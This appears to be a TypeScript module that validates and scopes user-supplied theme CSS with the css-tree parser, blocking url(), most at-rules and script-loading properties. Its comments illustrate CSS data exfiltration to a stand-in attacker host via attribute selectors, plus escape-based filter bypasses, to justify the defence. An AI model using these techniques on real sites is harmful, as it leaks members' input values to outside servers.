/**
 * The owner's free-form CSS: validated structurally, then scoped to its theme.
 *
 * ## What this is defending against
 *
 * Not the owner. The owner can already deface their own instance through
 * branding, and this feature exists because the token schema cannot cover every
 * component. Two other things:
 *
 * 1. **A theme pasted from the internet.** Themes export and import as JSON, so
 *    an owner can and will paste one somebody else wrote. Arbitrary CSS in a
 *    page is a data-exfiltration channel with no JavaScript involved: with
 *    `img-src 'self' data: https:` in the CSP — which remote posters require —
 *    `background-image: url(https://attacker/?x)` is permitted, and attribute
 *    selectors turn that into a character-by-character read of any input's value
 *    (`input[value^="a"] { background: url(…/a) }`). The victims are the
 *    instance's members, not the owner.
 * 2. **A stolen owner session.** Persistent, JavaScript-free exfiltration on
 *    every page for every member is a better foothold than most XSS, and it
 *    survives a password change. Hence `requireFreshAuth` on the route: this is
 *    a re-authenticate-to-change setting, like erasing an account.
 *
 * ## Why it parses instead of blocklisting substrings
 *
 * Because a substring blocklist for `url(` is not a defence. CSS lets an
 * identifier be escaped (`u\72 l(`), lets a comment sit inside a function name
 * (`ur/**\/l(`), is case-insensitive, and accepts `\0075` for `u`. Every one of
 * those defeats `includes('url(')` and none of them defeats a parser.
 *
 * `css-tree` is that parser, and this is the place the token schema's own note
 * predicted it would earn its keep — the token grammars turned out small enough
 * to hand-write, and this one is not.
 *
 * The rule is structural: the AST may contain no `Url` node anywhere, and no
 * at-rule outside a short list.
 *
 * ## The property that makes this work at all
 *
 * The output is REGENERATED from the AST, never passed through. So a browser can
 * only ever see css-tree's interpretation of the input, which closes the whole
 * class of parser-differential attacks — there is no "css-tree read it as X and
 * Chrome reads it as Y", because Chrome never sees the original bytes.
 *
 * ## Two cases that are not obvious
 *
 * **Custom properties.** css-tree parses `--x: anything` as a `Raw` value, and
 * correctly so: custom properties have no grammar. But a `Raw` that is never
 * inspected is a hole, and a specific one — this application uses
 * `var(--bg-pattern-image)` in `background-image`, so `--bg-pattern-image:
 * url(https://evil)` would load. Custom property values are therefore reparsed
 * in a value context and walked like everything else.
 *
 * **`@keyframes` are global.** Selector prefixing cannot scope them, so a
 * theme's `@keyframes spin` would silently redefine an animation the rest of the
 * site — and every other theme — uses. Each declared name is renamed with the
 * theme's slug, and the `animation` / `animation-name` references inside the
 * same stylesheet are rewritten to match, so the feature keeps working and the
 * leak closes.
 */
import * as csstree from 'css-tree';

/** 16 kB per theme. Ten enabled themes ride in one stylesheet every visitor gets. */
export const MAX_CUSTOM_CSS_BYTES = 16 * 1024;

/**
 * At-rules that may appear.
 *
 * `@media`, `@supports` and `@container` are conditionals; `@keyframes` is
 * renamed and kept. The notable exclusions are deliberate: `@import` makes a
 * request (a cross-origin one is blocked by `style-src 'self'`, a same-origin
 * one is not, and this feature has no reason to make either), `@font-face`
 * would let a theme redefine a curated family out from under the font role that
 * selected it, `@property` registers a custom property globally with a syntax
 * and an inherit flag — changing how the application's own tokens cascade and
 * animate — and `@layer` is a global ordering directive that a stylesheet of
 * prefixed selectors gains nothing from.
 */
const ALLOWED_AT_RULES = new Set(['media', 'supports', 'container', 'keyframes']);

/** Properties that reference an animation by name. */
const ANIMATION_PROPS = /^(animation|animation-name|-webkit-animation|-webkit-animation-name)$/i;

export interface CssIssue {
  readonly line: number;
  readonly reason: string;
}

export type CssResult =
  | { readonly ok: true; readonly css: string }
  | { readonly ok: false; readonly issues: readonly CssIssue[] };

function lineOf(node: csstree.CssNode): number {
  return node.loc?.start.line ?? 0;
}

/**
 * Rewrite one selector so it only matches under the theme's root.
 *
 * `html` and `:root` are replaced rather than prefixed — `:root[data-theme='x']
 * html` matches nothing, since `html` has no `html` ancestor. Everything else,
 * `body` and `*` included, becomes a descendant.
 *
 * The slug is interpolated into a selector that is then reparsed, which would be
 * an injection point if a slug could contain a quote. `SLUG_PATTERN` in
 * `utils/themes.ts` is what makes that impossible: lowercase letters, digits and
 * single hyphens, enforced at creation and frozen afterwards.
 */
function scopeSelector(selector: string, slug: string): string {
  const root = `:root[data-theme='${slug}']`;
  const trimmed = selector.trim();
  const head = /^(html|:root)\b/i.exec(trimmed);
  return head ? root + trimmed.slice(head[0].length) : `${root} ${trimmed}`;
}

/**
 * Validate, rename the keyframes, regenerate. Does NOT scope — see
 * `scopeCustomCss`.
 *
 * The split is not tidiness. A theme's CSS has to be emitted under more than one
 * selector: its own `[data-theme='slug']`, and again under
 * `[data-theme='system']` when an admin maps that theme to a half of system
 * mode. Storing it pre-scoped would make the second emission a string
 * substitution on the slug, which is exactly the kind of thing that works until
 * an owner writes `.nocturne-card` and it does not.
 *
 * So what is STORED is validated and regenerated but unscoped, and scoping
 * happens per emission. The emitter still never has to trust the column, because
 * the column already went through the parser.
 *
 * Returns every problem at once, because the alternative is an owner fixing a
 * twenty-rule stylesheet one round trip at a time.
 */
export function sanitiseCustomCss(source: string, slug: string): CssResult {
  const issues: CssIssue[] = [];

  if (Buffer.byteLength(source, 'utf8') > MAX_CUSTOM_CSS_BYTES) {
    return {
      ok: false,
      issues: [
        {
          line: 0,
          reason: `Too long: ${MAX_CUSTOM_CSS_BYTES} bytes maximum, because every enabled theme's CSS is in the one stylesheet each visitor downloads.`,
        },
      ],
    };
  }

  let ast: csstree.CssNode;
  try {
    ast = csstree.parse(source, {
      positions: true,
      // Parse values and preludes into real nodes rather than leaving them as
      // `Raw`. Without this the walk below would see one opaque blob per
      // declaration and could not find a `url()` inside it.
      parseValue: true,
      parseRulePrelude: true,
      parseAtrulePrelude: true,
      onParseError(error) {
        issues.push({ line: error.line ?? 0, reason: `Could not parse: ${error.message}` });
      },
    });
  } catch (err) {
    return {
      ok: false,
      issues: [{ line: 0, reason: `Could not parse: ${(err as Error).message}` }],
    };
  }

  const urlRefusal =
    'url() is not allowed: it turns a stylesheet into a way of telling another server who visited this page, with no JavaScript needed.';

  /** Custom property values, reparsed. See the note on custom properties above. */
  function checkCustomProperty(node: csstree.Declaration) {
    const raw = node.value;
    if (raw.type !== 'Raw') return;
    let value: csstree.CssNode;
    try {
      value = csstree.parse(raw.value, { context: 'value', positions: false });
    } catch {
      issues.push({
        line: lineOf(node),
        reason: `${node.property}: not a value this can check, so not accepted.`,
      });
      return;
    }
    csstree.walk(value, {
      visit: 'Url',
      enter() {
        issues.push({ line: lineOf(node), reason: urlRefusal });
      },
    });
  }

  csstree.walk(ast, {
    enter(node) {
      switch (node.type) {
        case 'Url':
          issues.push({ line: lineOf(node), reason: urlRefusal });
          break;
        case 'Atrule':
          if (!ALLOWED_AT_RULES.has(node.name.toLowerCase())) {
            issues.push({
              line: lineOf(node),
              reason: `@${node.name} is not allowed. Permitted: ${[...ALLOWED_AT_RULES]
                .map((a) => '@' + a)
                .join(', ')}.`,
            });
          }
          break;
        case 'Declaration':
          if (node.property.startsWith('--')) {
            checkCustomProperty(node);
          } else if (/^(-moz-binding|behavior)$/i.test(node.property)) {
            // Two properties that are script execution rather than style, both
            // long dead and both cheap to keep out.
            issues.push({
              line: lineOf(node),
              reason: `${node.property} is not allowed: it loads and runs code.`,
            });
          }
          break;
      }
    },
  });

  if (issues.length) return { ok: false, issues };

  // ── Rename the keyframes, then their references ──────────────────────
  const renamed = new Map<string, string>();
  csstree.walk(ast, {
    visit: 'Atrule',
    enter(node) {
      if (!node.name.toLowerCase().endsWith('keyframes')) return;
      const prelude = node.prelude;
      if (!prelude || prelude.type !== 'AtrulePrelude') return;
      for (const child of prelude.children) {
        if (child.type === 'Identifier' || child.type === 'String') {
          const from = child.type === 'String' ? child.value : child.name;
          const to = `${slug}-${from}`;
          renamed.set(from, to);
          Object.assign(child, { type: 'Identifier', name: to });
        }
      }
    },
  });

  if (renamed.size) {
    csstree.walk(ast, {
      visit: 'Declaration',
      enter(node) {
        if (!ANIMATION_PROPS.test(node.property)) return;
        csstree.walk(node.value, {
          visit: 'Identifier',
          enter(id) {
            const to = renamed.get(id.name);
            if (to) id.name = to;
          },
        });
      },
    });
  }

  return { ok: true, css: csstree.generate(ast) };
}

/**
 * Prefix every selector so the CSS only applies under one theme's root.
 *
 * Called at emit time, once per selector the theme needs to answer to — its own
 * slug, and `system` when it is mapped to a half of system mode.
 *
 * Input is assumed to have been through `sanitiseCustomCss` already. It is
 * parsed again here rather than manipulated as text, because a selector is not a
 * string with a prefix: `html`, `:root` and a comma-separated list each need
 * different handling, and a regex that gets two of the three right is worse than
 * no regex.
 */
export function scopeCustomCss(css: string, slug: string): string {
  if (!css.trim()) return '';
  let ast: csstree.CssNode;
  try {
    ast = csstree.parse(css, { parseRulePrelude: true });
  } catch {
    // Unreachable through the routes, and a silent drop rather than a broken
    // stylesheet if a row is ever edited by hand into something unparseable.
    return '';
  }
  csstree.walk(ast, {
    visit: 'Rule',
    enter(node) {
      if (node.prelude.type !== 'SelectorList') return;
      // Rules inside `@keyframes` have `from`/`to`/percentage preludes, not
      // selectors. Prefixing one produces `:root[data-theme='x'] from`, a valid
      // selector for an element called `from` — so the animation silently stops
      // working rather than failing loudly.
      if ((this.atrule?.name ?? '').toLowerCase().endsWith('keyframes')) return;
      for (const selectorItem of node.prelude.children) {
        const scoped = scopeSelector(csstree.generate(selectorItem), slug);
        Object.assign(selectorItem, csstree.parse(scoped, { context: 'selector' }));
      }
    },
  });
  return csstree.generate(ast);
}
